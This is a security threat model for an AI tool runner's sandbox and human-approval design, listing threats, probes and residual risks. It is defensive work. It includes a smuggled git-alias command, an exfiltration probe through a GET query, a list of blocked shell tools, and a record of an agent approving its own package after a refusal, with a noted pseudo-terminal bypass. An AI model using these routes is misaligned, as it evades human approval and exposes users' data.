# Threat model for the TAP runner

Evidence baseline: the October 1 review covered v0.1.1. Sections 1–8 are
historical, including probes superseded by later fixes. Their threat rows and
statuses must not be read as current release behavior. Section 9 and the final
status summary record the current controls and their evidence boundaries.

Earlier verification snapshot: signed [v0.1.15](https://github.com/Telara-Labs/TAP-Runtime/releases/tag/v0.1.15),
from `0198ea3e0935cccfcc9d286a1b7aab5932b1de71`, published October 5 at
21:29:08 UTC. All five downloaded platform binaries matched the checksum
manifest authenticated with the repository's pinned public key. A downloaded
macOS arm64 binary passed no-elicitation package trust/refusal/changed-digest
checks, one Discover-generated real Jira read and an HTTP 200 fetch through
one real proxy CONNECT. These focused checks do not establish a full native
v0.1.15 launch matrix.

Later signed v0.1.18 corrects finite CLI approval ceilings: an actual downloaded
macOS arm64 runner stopped owned writes at limits of 1 and 2. All five binary
hashes verified against the authenticated manifest. The built-CLI regression
and owning host suite also passed. A subsequent native Windows source check
found that bare UNC volume roots escaped declaration refusal; its correction
and native verification are tracked in TENG-3104. These checks do not establish
complete Windows security acceptance.

Earlier release evidence: signed [v0.1.14](https://github.com/Telara-Labs/TAP-Runtime/releases/tag/v0.1.14),
from `fd5b0b82b81248de3d7c8a1b52cb87069b0f3a1d`. GitHub published it on
October 5 at 20:56:08 UTC. npm records publication at 20:59:57.357 UTC;
a fresh public registry check confirmed it after publication.

An independently downloaded macOS arm64 v0.1.14 binary and its signed manifest
verified against the pinned release key. External MCP stdio checks with
capabilities `{}` refused an untrusted package before starting a run, permitted
the owner-pretrusted exact digest, and refused its edited entrypoint digest.
The same runner executed a Discover-generated tool-only primitive making one
real Jira read, with no refused actions or external writes. A real HTTPS proxy
test completed HTTP 200 through exactly one CONNECT request. These checks
establish those released protocol paths, not GUI approval acceptance or native
release acceptance on every platform.

Earlier v0.1.13 included the complete installer invocation, pointer repair and
digest-scoped CLI fetch grants, but skipped package-wide trust for clients
advertising no elicitation. That gap is fixed in v0.1.14. The native Claude Code
2.1.289 public GET and its separate package-trust and origin forms were tested
against v0.1.13, with forms answered by UI automation; they are not a new
v0.1.14 GUI check. Historical reports and later remediation receipts live
locally under `dist/verification-2026-10-05/`; they are not public repository
artifacts.

This is a description of what the runner is meant to stop, what it does stop
according to code and tests that were read and run, and what it does not stop.
It does not claim the runner is secure or safe. Where a protection could not be
checked, it is marked unverified.

## How to read the evidence

- **File and line references** (for example `host/main.go:531`) point into the
  source revision of the original review; those line numbers may have moved.
  The runner source is now public in this repository. Use named functions
  and the exact version being assessed rather than stale line numbers.
- **Test names** are Go tests in that tree. They were run on 2026-10-01 with
  `GOWORK=off go test -count=1`. Results are in "Tests that were run".
- **Manual probes** were small primitives written for this review and run
  against a build of the runner. They are not in the test suite. Each is
  described in "Manual probes" so it can be repeated.
- The source tree used for the review is not a Git checkout, so no revision
  was recorded for that historical review. The v0.1.1 binaries were not rebuilt and
  compared byte for byte.
- `discover/` (`tap discover`) was out of scope and is not covered here.

## 1. What is being protected, and the trust boundaries

TAP lets an AI client run a small program (a *primitive*) as one tool,
`tap_run`. The program runs in a WebAssembly sandbox and every effect it wants
(a tool call, a host command, a file, a web request) is a request to the
runner, which checks it against the primitive's `primitive.yaml`, asks the
person before a change, and records it.

The thing being protected is the person's machine, their data, and the
accounts reachable through their AI client, against code and text they did not
write and cannot fully review at run time.

```
 person ──approves──▶ AI client ──tap_run──▶ runner (host process, user's privileges)
                          ▲                     │  request protocol (JSON lines)
                          │                     ▼
                connected tools           wasm guest: interpreter + primitive program
                (MCP servers)
```

| # | Boundary | Who is on each side | What crosses it |
|---|---|---|---|
| B1 | Wasm guest to host runner | The primitive program (and the interpreter it runs in) on one side; the runner on the other | JSON requests on stdin/stdout only. The guest is given no file system, environment or sockets (`host/main.go:937-953`) |
| B2 | Host runner to the machine | The runner and the user's real privileges | Declared files, declared host programs, declared web origins. Everything the user can do, a declared host program can do |
| B3 | AI model to runner | A model, possibly steered by prompt injection, and the runner | A package path and string arguments to `tap_run` (`host/serve.go:223-235`) |
| B4 | Runner to the person | The runner and the person at the client | An MCP elicitation prompt: allow this kind of change, how many times (`host/serve.go:184-221`) |
| B5 | Runner to connected tools | The runner and MCP servers the client has connected | Tool calls made through the client's own sessions, and the tools' answers and annotations |
| B6 | Primitive author to user | The person who wrote the primitive and the person who runs it | A `primitive.yaml` and one program. The user usually does not read either at run time |
| B7 | Release and install chain | Whoever publishes releases, GitHub, and the user's machine | `install.sh` / `install.ps1`, runner binaries, the VS Code extension |
| B8 | Interpreter downloads | Upstream hosts of the Python, QuickJS and shell interpreters, and the runner | Wasm files, checked against a sha256 written into the runner (`host/interpreters.go:50-72`) |
| B9 | Local other processes | Other processes of the same user, and of other users | Files in the user's cache directory, local sockets |

Components, in the order a request travels:

1. **Primitive program.** Bash, Python, JavaScript or TypeScript source. Treated
   as untrusted.
2. **Wasm guest.** The interpreter (the runner's own `guest-sh`, CPython 3.12,
   QuickJS-ng 0.17) run by wazero. Treated as a container, not as trusted.
3. **Host runner.** Go, `host/`. Trusted. Runs with the user's privileges.
4. **AI client.** Claude Code, Codex, VS Code, Gemini CLI, or a claude.ai page.
   Trusted to show approval prompts and to make tool calls honestly. Its model
   is not trusted.
5. **Connected tools.** MCP servers behind the client. Their answers and their
   self-description (annotations) are not trusted.
6. **The person approving.** The only party whose "yes" authorises a change.
7. **Release and install chain.** Trusted to deliver the bytes that were built.
8. **Interpreter downloads.** Trusted only as far as the pinned sha256.

## 2. Assets

| ID | Asset | Why it matters |
|---|---|---|
| A1 | Files on the user's machine | Source, keys, documents. Reachable through declared files and host programs |
| A2 | Credentials in the user's environment and home directory | `HOME` is always passed to host programs; other variables only when declared (`host/commands.go:81`) |
| A3 | Data behind connected tools (mail, tickets, calendar, drives) | The runner borrows the client's sessions, so it reaches whatever the client can |
| A4 | The ability to make changes (writes, deletes, sends, spend) | The point of the approval step |
| A5 | The person's attention and trust in the approval prompt | Approval fatigue or a misleading prompt defeats B4 |
| A6 | The integrity of what is installed (runner, interpreters, extension) | Everything else depends on it |
| A7 | The run record and logs | Contain tool results, paths, URLs. A resume trusts the record |
| A8 | The model's context | Output returned by `tap_run` is read by a model |
| A9 | Machine resources (CPU, memory, time) | A runaway program affects the user's session |

## 3. Adversaries

| ID | Adversary | Capability assumed | Goal |
|---|---|---|---|
| X1 | Malicious primitive author | Writes `primitive.yaml` and the program. Controls declarations, the program's behavior, and the text the approval prompt shows | Read data, send it out, make changes, run code on the host, mislead the approver |
| X1b | Buggy primitive author | Same files, no intent | Accidental damage: over-broad declarations, a loop that never ends, a write to the wrong place |
| X2 | Prompt-injected model driving `tap_run` | Chooses which package path and arguments to pass, repeatedly. Cannot answer the approval prompt | Run a hostile package, wear the person down with prompts, pass hostile arguments |
| X3 | Malicious tool output | A connected tool or a content source behind it (an email, a ticket) returns attacker text; a tool's annotations may be false | Steer the program or the model; make a write look like a read |
| X4 | Compromised download or release | Controls bytes served at a release URL, or at an interpreter URL | Run attacker code as the user |
| X5 | Local other process | Runs as the same user, or as another user, on the same machine | Read run records, swap files, connect to the runner's sockets, impersonate a client |

Out of scope as adversaries: a compromised AI client, a compromised operating
system, a malicious user at their own keyboard, and side channels against the
wasm engine.

## 4. Historical threats (v0.1.1)

Status values: **mitigated** (a control exists and was read or tested),
**partial** (a control exists with a stated hole), **not mitigated** (no
control), **unverified** (a control is described in code or docs but its effect
could not be checked here).

"Probe" refers to the manual probes in section 7. "Test" refers to Go tests in
section 7.

### Guest sandbox and host capabilities

| ID | Threat | Mitigation as implemented | Evidence | Residual risk | Status |
|---|---|---|---|---|---|
| T1 | The guest reads files, environment variables, the network or processes directly (X1) | The guest module is built with no file-system config, no environment, no sockets, and no process call. Python gets no mount in the normal path | `host/main.go:937-953` (`guestConfig`); Probe P1 (Python), P2 (QuickJS), P3 (bash): environment empty, `/etc/passwd` unreadable, socket connect gives `Errno 58 Not supported`, subprocess gives `wasi does not support processes`; conformance lanes "a program does not see the runner's environment" and others, `TestThisRunnerPassesEveryLane` | Containment rests on wazero and on the wasm interpreters granting nothing. The Python build imports `socket`, `os`, `subprocess` and fails at the call, not at the import. Not checked on Linux or Windows | mitigated (macOS arm64 only) |
| T2 | The guest reads or writes a file outside what the manifest declares, by `../`, a sibling prefix, an absolute path or a symbolic link (X1) | Paths are resolved through symbolic links before matching; the match is on whole path segments; writes need access `write` | `host/capabilities.go:41-120`, `186-246`; `TestFilesAreBoundedByWhatIsDeclared`, `TestFilePatterns`; conformance lane "a declared directory cannot be left through a symbolic link" | A path is resolved at one moment and opened at another (`capabilities.go:190` then `220`/`228`), so a same-user process that swaps a link in between is not stopped. Not tested. Relative paths resolve against the runner's working directory, which the client chooses | mitigated for the guest; the swap race is unverified |
| T3 | The guest runs a host program it did not declare (X1) | `command` must be a bare program name; only declared command lines match; all others are refused before anything starts | `contract/manifest/manifest.go:226-257`; `host/commands.go:158-189`, `227-243`; `TestRunCommandAgainstRealPrograms`, `TestTheMostSpecificDeclarationDecides`; conformance lane "a program cannot run a command it did not declare" | The program that runs is found on `PATH` (`commands.go:250`); a process that can change the user's `PATH` can choose it | mitigated |
| T4 | A declared host command with broad arguments runs arbitrary code while labeled `read`, so it runs with no approval (X1, X1b) | A short list of programs is forced to `destructive` whatever the manifest says (`bash`, `sh`, `env`, `xargs`, `docker run`, `kubectl exec`, `python`, `node`, `ssh`, `sudo`, `find -exec`, and a few more). The docs example narrows commands with `globals` and a subcommand | `host/commands.go:41-75`; Probe P6: a manifest with `{command: git, args: ["*"], effect: read}` ran `git -c alias.pwn='!echo ... > file' pwn` with no approval and the shell command executed | The list is hand-maintained, and the source comment says so (`commands.go:38-40`). `git -c`, `awk`, `make`, `npm`, `tar`, `curl`, `less` and many others are not on it. A `["*"]` declaration is accepted without warning | partial |
| T5 | A host program inherits secrets from the runner's environment (X1) | Only `PATH HOME USER LANG TMPDIR` plus names the manifest declares are passed. A pattern that matches everything is refused | `host/commands.go:81`, `205-225`; `contract/manifest/manifest.go:249-256`; `TestEnvironmentIsWithheldUnlessDeclared` | `HOME` is always passed, so a host program finds `~/.ssh`, `~/.kube`, `~/.aws`. A declared host program runs with the user's real privileges and current directory (`commands.go:259-261`). See section 5 | partial (by design) |
| T6 | The guest reaches an undeclared web origin, directly or through a redirect (X1) | Origin and method must match a declaration; each redirect is re-checked against the declarations; at most five redirects | `host/capabilities.go:123-150`, `283-297`; `TestFetchIsBoundedByOriginAndMethod`, `TestFetchSubdomainWildcard`; conformance lane "a program can fetch only the origins it declared" | The resolved address is never checked, so a declared name that resolves to loopback, a private range or a metadata address is reachable. `http://` and IP-literal origins are accepted by the manifest (`manifest.go:266-283`). Probe P5 fetched `http://127.0.0.1:8765` | partial |
| T7 | Data leaves through a channel the runner treats as a read (X1, X3) | None. `GET` and `HEAD` are `read` and run with no approval; the URL, headers and body are the guest's | `host/capabilities.go:265-282`; `host/main.go:594-598`; Probe P5: a primitive with `files: [{path: in, access: read}]` and one `fetch` origin sent the contents of `in/secret.txt` in a `GET` query string with no approval and no prompt | Anything a primitive may read (declared files, tool results, command output) can be sent to any declared origin. The declarations are the only barrier and the person is not shown them at run time | not mitigated |
| T8 | A change is made without the person's yes (X1, X2) | Every file write, non-`GET` fetch, non-`read` command and non-`read` tool call is first tried without approval and comes back "gated". It runs only after an approval is found or asked for | `host/main.go:531-574` (`gate`); `host/capabilities.go:205-210`, `270-274`; `host/commands.go:245-249`; `host/tools.go:301-305`; `TestServeWritesNothingWithoutAnExplicitYes`, `TestServeAsksOncePerKindAndWritesOnYes`, `TestCallGate`; conformance lanes "a change is made when a person says yes" and "no change is made when a person says no" | The effect class is what the manifest declares (raised to `write` when a tool's server says nothing). A wrong declaration is a wrong gate. See T16 | mitigated for declared effects |
| T9 | Output of a primitive, or a tool, is used to steer the model (X1, X3) | None in the runner. The program's stdout and stderr, and any tool text the program prints, go back to the client as the `tap_run` result | `host/serve.go:319-338` | Prompt injection through the result is not addressed. A tool result checked against a declared result schema is rejected if it does not match (`host/tools.go:313-323`, `TestAnAnswerIsHeldToTheContract`), but that is not a defense against text in a conforming field | not mitigated |

### Approval

| ID | Threat | Mitigation as implemented | Evidence | Residual risk | Status |
|---|---|---|---|---|---|
| T10 | The model answers the approval itself (X2) | The approval is an MCP elicitation sent to the client, not a tool result the model sees. Anything but an explicit accept with the box ticked is a no; a decline is remembered for the run | `host/serve.go:184-221`; `TestServeWritesNothingWithoutAnExplicitYes` (decline, cancel, unticked, empty) | Depends on the client showing the prompt to the person and not auto-accepting it. Not checked for any client except through the live tests in section 7 | partial |
| T11 | A client that cannot show a prompt approves by default (X2) | A client that does not advertise elicitation is never asked and every change is refused | `host/serve.go:294-297`, `335-337`; `TestServeNeverAsksAClientThatCannotShowAPrompt`; conformance lane "a client that cannot show a prompt gets no changes" | Fails closed. Such a client cannot run any primitive that changes anything | mitigated |
| T11a | A reads-only primitive runs in a client that cannot show a prompt without anyone agreeing (X2) | A client without elicitation runs a primitive with no TAP prompt only when its manifest declares nothing but reads (fetch `GET`/`HEAD`, files `read`, tools `read`, commands `read`) **and** the agent's own settings let its model do each kind of thing the primitive does without asking: fetch the web if it fetches (OpenCode and Kilo `permission.webfetch` allow or unset, Crush `allowed_tools` listing `fetch`, Goose `GOOSE_MODE: auto`, Gemini CLI in yolo mode or `tools.allowed` listing `web_fetch`), and run shell commands if it runs a program (`permission.bash` allow or unset, a pattern map only when `"*"` alone is allow; Crush `bash`; Goose `auto`; Gemini CLI yolo or `run_shell_command`). Since v0.2.16 read-only host programs qualify: the approval comes from the agent, and the primitive may do unasked only what the agent itself does unasked. Gemini CLI's yolo mode is read from its own command line: the relay passes its parent process to the shared runner, which looks for Gemini CLI among it and its next ancestors. Decided on every run and never stored; changing the agent's setting to ask ends it, and the refusal names that setting. Changes are still refused there | `host/autotrust.go`; `host/serve.go` (`tap_run`); `TestAReadsOnlyPrimitiveRunsInAnAgentThatCannotPrompt`, `TestAReadOnlyProgramRunsWhereTheAgentRunsShellUnasked`, `TestEachAgentsOwnShellPermissionIsRead`, `TestEachAgentsOwnWebPermissionIsRead`, `TestGeminiYoloIsReadFromItsCommandLine`, `TestReadsOnly` | A primitive an injected agent saved can send what it reads to its declared origins in later sessions (T7), as the agent itself could with its own fetch. A program's `read` label is the author's claim (T4): where the agent runs shell commands unasked, a mislabelled `git push` runs unasked, as the agent's own shell could run it. A program that runs other code (`git -c`, `bash -c`) still counts as destructive on every call (`TestAReadDeclarationDoesNotLetARunnerOfOtherCodeRunUnasked`). The agent's setting is read from its config file on disk, which the agent may be able to edit | mitigated (deliberate) |
| T11b | One approved read fetch is asked again on every run (usability) | Since v0.2.7 a `GET`/`HEAD` origin the person approves in a prompt is kept for that exact package digest, beside package trust; a later run of the same version is not asked; a new digest asks again. Changes are still asked each run | `host/main.go` (`RememberGrant`, `readFetchKind`); `host/trust.go` (`FetchGrants`); `TestAnApprovedReadFetchIsNotAskedAgainForTheSameVersion` | `tap trust --list` shows the kept approvals; `--forget` removes them | mitigated |
| T11c | The agent approves its own primitive with `tap trust` from its shell (X2) | Found testing Kilo (v0.2.5): after a refusal the model ran `tap trust PACKAGE-DIR` itself. Since v0.2.7 `tap trust PACKAGE-DIR` shows what the package declares on the controlling terminal and requires a typed `yes`; with no terminal it refuses and says to run it in the person's own terminal. An agent's shell tool has no controlling terminal | `host/trust_confirm.go`; `host/trust.go` (`trustCommand`); `TestTapTrustRefusesWithoutATerminal` | An agent that can drive a pseudo-terminal (`script`, `expect`) can still type `yes`; that is deliberate circumvention, and the grant is recorded in `tap trust --list` | mitigated |
| T12 | One "yes" covers more than the person saw (X1) | Approval is per kind of change (one tool, one command pattern, one directory, one origin) with a count the person sets (default 1). Reaching the count asks again and says how many were made | `host/main.go:513-574`; `host/serve.go:184-221`; `TestAnAllowanceIsForOneKind`, `TestReachingTheCeilingAsksAgain` | After the first, later changes of the same kind are not shown. A count above 1 approves arguments the person has not seen. `Example` shows only the change that is waiting | partial |
| T13 | The prompt text misleads (X1) | The primitive name is limited to lower-case letters, digits and hyphens. The kind comes from the declaration | `contract/manifest/manifest.go:136-139`, `195-197`; `host/serve.go:189-191` | The `Example` line is built from guest-chosen arguments and is unbounded. How a client renders newlines or long text was not checked | unverified |
| T14 | Prompt fatigue: a steered model starts many runs, or one run asks many times (X2) | A decline is remembered for one run. Nothing limits how many runs are started | `host/main.go:548-550`; `host/serve.go:270-312` | No rate limit, no memory of declines across runs | not mitigated |
| T15 | A steered model runs a hostile package it found or was given (X2, X1) | None in the runner. `tap_run` takes any path the model names; the manifest is read from there | `host/serve.go:290-302`, `host/main.go:268-282` | The only brake is the client's own permission step for the `tap_run` tool, which the tool marks `destructiveHint: true` (`serve.go:234`). Users who allow-list `tap_run` remove it. The docs suggest approving `tap_run` for `codex exec` (`install.md`, "Codex") | not mitigated |
| T16 | `--approve` on the command line approves everything (user error, X1) | It is a flag the person types. A positive `--limit N` is total consent per kind in that CLI invocation; the CLI refuses further changes instead of renewing it | `host/main.go`; `TestCLIApprovalCeilingStopsOwnedWrites` exercises the built CLI | Signed v0.1.17 renewed depleted finite consent and exceeded limits of 1 and 2. TENG-3036 corrects the CLI callback and records source/released verification separately; interactive callers can still ask for another grant. Explicit approval on a resumed invocation grants a new allowance for new changes, without redoing replayed requests | mitigated in corrected source |
| T17 | In relay clients (Gemini CLI) and in VS Code, the runner treats tool calls as already approved and leaves the decision to the client | `clientApprovesCalls` grants unlimited approval to `call ...` kinds only. File writes, host commands and web requests are still gated by the runner | `host/serve.go:303-309`, `357`, `375-385`; `host/main.go:245-248`; `TestRelayStillGatesWhatTheClientDoesNotSee` | The runner has no way to know the client confirmed. Gemini CLI was never run (docs say so). The VS Code extension calls `invokeTool` with `toolInvocationToken: undefined` (`vscode/extension.js:73`), and whether VS Code confirms in that case was not checked. If the client does not confirm, a write tool runs with no prompt | unverified |

### Connected tools

| ID | Threat | Mitigation as implemented | Evidence | Residual risk | Status |
|---|---|---|---|---|---|
| T18 | A different MCP server in the client binds in place of the intended one by choosing a matching name (X3) | A tool binds by name rank, and where the client gives input schemas the first tool whose schema satisfies the contract wins. A `pin: {server, tool}` names an exact tool and is also schema-checked where schemas exist | `bind/bind.go:182-243`; `host/tools.go:159-231`; Probe P4: with a real `claude.ai Gmail / search_threads` and `aaa-untrusted / gmail_search_threads` both present, the second bound (equal score, ties broken by server name in byte order) | The provider word may come from the tool name instead of the server name, so any server can claim it. Claude Code gives no schemas (`bridge/claude.go:128`), so there is no schema check there. Pinning removes the problem for a primitive that pins | not mitigated for unpinned tools |
| T19 | A tool's own description of its effect is false (X3) | A tool annotated more dangerous than declared does not bind. A tool with no annotation is treated as a write and gated | `bind/bind.go:205-210`; `host/tools.go:179`, `262-267`; `TestCallGate`, `TestResolveAgainstClaudeCodeInventory`, `TestResolveAgainstCodexInventory` | A server that annotates a destructive tool as read-only gets it called with no approval. This is trust in the server's annotation | partial |
| T20 | The program calls a bound tool with arguments the contract never described (X1) | At admission, a tool's input schema must accept every argument the contract names and the contract must supply every required one. At call time the arguments are passed through unchanged | `satisfy/satisfy.go:106-147` (admission only); `host/tools.go:307` (call) | A bound tool can be called with any argument it accepts. The contract limits which tool binds, not what it is asked | not mitigated |
| T21 | The user's own tool restrictions are not honored (X2, X3) | Claude Code: the runner reads the user's `deny` rules and refuses a matching tool at admission | `bridge/claude.go:169-201`; `TestAdmitRefusesAToolTheUserDenied`; `TestLiveClaudeInventoryAndDenyRules` | Only `deny` rules of Claude Code are read; its `ask` rules are not. For Codex, VS Code, the direct MCP bridge and the Gemini relay `Denied` always returns false (`bridge/codex.go:173-175`, `bridge/vscode.go:76`, `bridge/mcp.go:109-111`, `host/relay.go:275`) | partial |
| T22 | The direct MCP bridge sends credentials to the wrong place or in the clear (X5) | Redirects are never followed, so extra headers do not follow a redirect. Header lines come from a file, not a flag. Responses are size-bounded | `bridge/mcp.go:44-51`, `36-37`; `host/tools.go:82-101`; `TestMCPBridgeRefusesRedirects`, `TestMCPBridgeBoundsAJSONResponse`, `TestParseHeaderLines` | `http://` URLs are not refused, so a bearer header can travel unencrypted. No server certificate pinning | partial |

### Resources

| ID | Threat | Mitigation as implemented | Evidence | Residual risk | Status |
|---|---|---|---|---|---|
| T23 | A program (buggy or hostile) uses all CPU, memory or time, or never returns (X1, X1b) | None. A cancel path exists but nothing triggers it except a crash. `timeoutSeconds` and `limits` are accepted by the manifest parser and never read. Host programs have no timeout; their output is buffered without a cap | `contract/manifest/manifest.go:113-122`; `host/main.go:457-459`, `719`; `host/commands.go:256-280`; Probe P7: `for(;;){}` was still running after 10 s, and still after 6 s with `timeoutSeconds: 2`; a Python primitive allocated 1 GiB without a refusal | The user must kill the process. A manifest field that reads as a limit is not one | not mitigated |

### Supply chain and install

| ID | Threat | Mitigation as implemented | Evidence | Residual risk | Status |
|---|---|---|---|---|---|
| T24 | A tampered interpreter download (X4) | Python and QuickJS are fetched from pinned URLs and checked against a sha256 written in the runner. The check runs on download and on every later read from the store. The bash interpreter is built with the release, and its digest is written into the runner by the release build | `host/interpreters.go:50-72`, `88-120`; `release/release.go:143-159`; `TestObtainRefusesAlteredInterpreter`, `TestEveryPublishedInterpreterIsPinned`, `TestAReleasedRunnerFetchesItsShInterpreter`; the cached Python and QuickJS files on the review machine hash to the pinned values | The pins protect against a different file at the same address, not against the pinned file being unsafe: the contents of the Python and QuickJS wasm modules were not audited. A runner built from source has no digest for the bash interpreter (`interpreters.go:40-45`). The store is writable by the user; a changed file is refused at the next read | mitigated against swap; contents unaudited |
| T25 | A tampered runner binary reaches the user (X4) | `install.sh` and `install.ps1` carry the sha256 of each runner and delete a download that does not match. `SHA256SUMS` lists every file | `dist/v0.1.1/install.sh:34-37`, `58-63`; `release/install.go:18-47`; `TestInstallScriptRefusesAnAlteredRunner`, `TestInstallersPinEveryRunner`; I recomputed `SHA256SUMS` for the files in `dist/v0.1.1` and every line matched | The script and the binaries come from the same release, so an attacker who controls the release replaces both and the digests agree. v0.1.1 is unsigned (no `SHA256SUMS.sig` in `dist/v0.1.1`); signing code exists (`release/release.go:223-239`) and was not used. Release files are uploaded by a script with a personal access token read at a prompt (`dist/publish-v0.1.1.sh`). `install.sh` is not wrapped in a function, so a cut-off pipe runs a partial script. `install.ps1` has never been run | partial |
| T26 | A release is not what the source says (X4) | The build is intended to be reproducible: fixed flags, no VCS stamp, no build id | `release/release.go:102-110`; `TestAReleaseIsReproducible` (two builds in one environment match) | Reproducibility was shown on one machine, not by a third party, and the v0.1.1 binaries were not rebuilt here. The source is not in the public repository, so no one outside can try | unverified |
| T27 | The VS Code extension runs a binary chosen by a workspace, or exposes the editor's tools too widely (X5, X1) | The extension's socket sits in a directory with mode 0700 | `vscode/extension.js:83-111`; `vscode/package.json:24-28` | `tapRuntime.path` is a plain setting without `"scope": "machine"`, so a workspace can set it, and the extension runs that path (`extension.js:32-43`, `136`). Any local process of the same user that can open the socket can call any language-model tool the editor has (`extension.js:63-81`). Behavior under VS Code's Workspace Trust was not checked | unverified |

### Local other processes and data at rest

| ID | Threat | Mitigation as implemented | Evidence | Residual risk | Status |
|---|---|---|---|---|---|
| T28 | Another user reads run records or injects into a run (X5) | Run directories 0700, index and blobs 0600, lease file 0600, relay directory 0700. One process at a time may continue a run (lease with a 30 s expiry) | `journal/journal.go:107-110`, `345`; `journal/lease.go:21-105`; `host/relay.go:95-122`; `TestASecondResumerIsRefusedAndToldWhoHoldsTheRun`; directory modes observed on the review machine (`runs` 0700, entries 0700/0600) | When the relay socket path is too long it falls back to `os.TempDir()/tap-relay-<pid>.sock` after `os.Remove` of that fixed name (`relay.go:111-114`). Socket permissions on macOS were not checked. The interpreter store is 0755 with files 0644 (`interpreters.go:106-109`) | partial |
| T29 | The run record is altered to replay a different answer (X5, same user) | Each request is digested; a changed request under a known id stops the run; a result blob is checked against its sha256 name; a resume is refused if the package changed | `journal/journal.go:230-255`; `host/main.go:310-313`; `TestAChangedRequestIsNoticed`, `TestAnAlteredResultIsRefused`, `TestResumeRefusesAChangedPackage` | The index file is plain append-only text with no chain or signature, so a same-user process can rewrite it. The record is for crash recovery, not tamper evidence | partial |
| T30 | Sensitive data persists or leaks through records and logs (X5, X1) | Telemetry is off unless `OTEL_EXPORTER_OTLP_ENDPOINT` is set. When on, events only; arguments, paths, URLs (host kept) and errors are withheld unless `--otel-payloads` | `host/otel.go:37-40`, `137-175`; `TestEventsAreExportedAndPayloadsAreNot`, `TestPayloadsAreExportedOnlyWhenEnabled`, `TestNothingIsExportedUnlessAnEndpointIsSet` | The run record stores every reply, including full tool results, for 30 days by default (`host/main.go:226`, `journal/journal.go:284-305`). The runner's stderr logs full URLs including query strings and full command lines (Probe P5 shows a secret in the logged URL; `host/capabilities.go:309`, `host/commands.go:277`). OTLP headers set with `tap install --env` are stored in the client's configuration. `--no-record` exists for the CLI only; `tap serve` has no switch | partial |
| T31 | Written files are readable by others (X5) | None | `host/capabilities.go:216` (directories 0755), `220` (files 0644) | A file written by a primitive is world-readable unless the user's umask says otherwise | not mitigated |
| T32 | Installing changes the client's configuration in a way that is hard to undo | `tap install` uses the client's own `mcp add`. For Gemini it rewrites `~/.gemini/settings.json`, keeps a `.tap-backup` copy, and refuses a file that is not plain JSON | `host/install.go:94-103`, `133-198`; `TestInstallReplacesAnEarlierRegistration`, `TestAddGeminiKeepsSettings` | The Gemini hook runs after every Gemini tool call (`install.go:176-182`); it acts only on calls that match a waiting run (`host/hook.go:111-128`) | partial |

### Web page (claude.ai Artifact) path

| ID | Threat | Mitigation as implemented | Evidence | Residual risk | Status |
|---|---|---|---|---|---|
| T33 | A primitive in the web page changes something, or reaches something it did not declare (X1, X2) | `tap web build` refuses any primitive that declares commands, files, fetch, an unpinned tool or a tool whose effect is not `read`. The page checks the interpreter against its sha256 before starting and answers only the pinned connector tools. A job holds a primitive name and arguments, never code | `host/web.go:108-148`, `153-159`; `host/webassets/worker.html:130-137`, `148-163`; `host/webassets/tapweb.js:50-93`, `133-157`; `TestWebBuild`, `TestWebBuildRefuses` | There is no annotation check and no approval on this path: a connector tool declared `read` is called even if it changes data. The guest's arguments to the tool are unchecked (as T20). Anyone who can write to the page's `jobs` collection can start any built-in primitive with any arguments. What an Artifact sandbox and its `mcp` capability enforce was not reviewed | partial |

## 5. Explicit non-goals and known limits

These are not oversights. The runner does not try to do them, or it does them
only partly, and a reader should plan for that.

1. **The Python interpreter imports file and socket modules and is contained only
   because nothing is granted.** `import socket`, `os` and `subprocess`
   succeed. The calls fail because the host gives the guest no sockets,
   no file system and no process call (Probe P1). If a future runner build
   grants a mount or a socket to make something work, the interpreter will use
   it. `host/main.go:937-953` is the one place to watch.
2. **v0.1.1 is unsigned. Only sha256 is pinned.** The pins are in a script and
   binaries published together. They protect against corruption and a
   tampered mirror, not against whoever controls the release.
3. **`tap --approve` on the command line agrees to everything**, for every kind
   of change, with no limit unless `--limit` is given. It is for a person who has
   read the primitive.
4. **Host programs a manifest declares run with the user's real privileges**,
   in the runner's working directory, with `HOME`, `PATH`, `USER`, `LANG` and
   `TMPDIR` set. The sandbox does not extend to them. A `read` command is run
   with no approval. The effect label is the author's claim, checked only against a short
   built-in list (T4).
5. **A client that cannot show an approval prompt gets every change refused.**
   This is fail-closed. A person using such a client cannot approve anything.
   A primitive that only reads runs there when the agent's own settings let
   its model do the same unasked: fetch the web, or (since v0.2.16) run a
   read-only program (T11a).
6. **Reads are not asked about.** Reading a declared file, a `GET`, a `read`
   command and a `read` tool call run without a prompt, and their results are
   available to the program (T7).
7. **The approval is per kind of change, not per argument.** The person sees the
   change that is waiting, not the next ones.
8. **The runner does not judge the program.** It does not read it, scan it, or
   show it to the person. The person's only decision is whether to run the package
   they, or their model, chose.
9. **The runner does not filter what goes back to the model.** Output from a
   primitive or from a tool can contain text meant to steer the model (T9).
10. **Telemetry and payloads.** Off by default. When an OpenTelemetry endpoint is
    set, events (names, outcomes, counts, digests, origins) are sent, and
    arguments, paths and full URLs only with `--otel-payloads`. The local run
    record and stderr log are separate and are not covered by that switch (T30).
11. **Platform coverage.** The docs state macOS arm64 is tested, Linux amd64 and
    arm64 run the suite in CI, Windows amd64 is a subset under Wine, and macOS
    amd64 has never been run. This review ran on macOS arm64 only.
12. **Client bridges are stand-ins.** The Claude Code bridge uses an undocumented
    control channel and starts a second `claude` process found on `PATH`
    (`bridge/claude.go:31-60`). The Codex bridge uses an interface Codex marks
    experimental. Either can change under the runner. Versions the runner was
    run against are listed in `bridge/bridge.go:39-42`; an unlisted version
    runs with a warning, not a refusal.
13. **Preview and experimental paths.** The claude.ai page, VS Code extension and
    Gemini CLI relay are labeled preview or experimental in the docs, and the
    Gemini path was never run against Gemini CLI.
14. **Not a defense against a malicious user, a compromised client, or a
    compromised operating system.**

## 6. What was not verified

- Anything on Linux, Windows or macOS Intel. The CI results the docs refer to
  were not seen.
- Whether any real client shows the elicitation prompt, honors "decline" as the
  runner expects, or renders long or multi-line prompt text safely. The live
  tests (`TestLiveElicitationThroughClaudeCode`, `TestLiveElicitationThroughCodex`)
  were not run in this review.
- Whether Gemini CLI or VS Code confirm tool calls that the runner hands them
  (T17), and VS Code's behavior with `toolInvocationToken: undefined`.
- The VS Code extension under Workspace Trust, and whether other extensions can
  reach its socket (T27).
- The contents of the Python 3.12.0 and QuickJS-ng 0.17.0 wasm modules, and of
  wazero. They were treated as inputs. Only their sha256 was compared.
- Side channels, timing, and wasm engine escapes. Not examined.
- The claude.ai Artifact sandbox and what its `mcp`, `db` and `permissions`
  capabilities enforce (T33).
- The `guest-sh` interpreter's behavior beyond the probes (a modified copy of
  `mvdan.cc/sh` under `third_party/sh`). Its built-in `cat`, `jq`, `head`, `wc`
